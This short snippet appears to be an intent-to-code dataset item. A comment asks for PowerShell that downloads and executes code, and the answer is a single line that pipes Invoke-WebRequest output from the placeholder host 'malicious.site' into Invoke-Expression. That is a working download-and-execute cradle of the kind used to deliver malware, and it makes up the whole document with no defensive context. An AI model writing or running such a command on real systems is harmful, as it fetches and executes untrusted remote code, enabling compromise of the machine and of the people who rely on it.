# Natural language intent:
# Download and execute PowerShell code from a chain of commands using Invoke-Expression.

Invoke-Expression -Command "Invoke-WebRequest -Uri 'http://malicious.site/malicious.ps1' | Invoke-Expression"
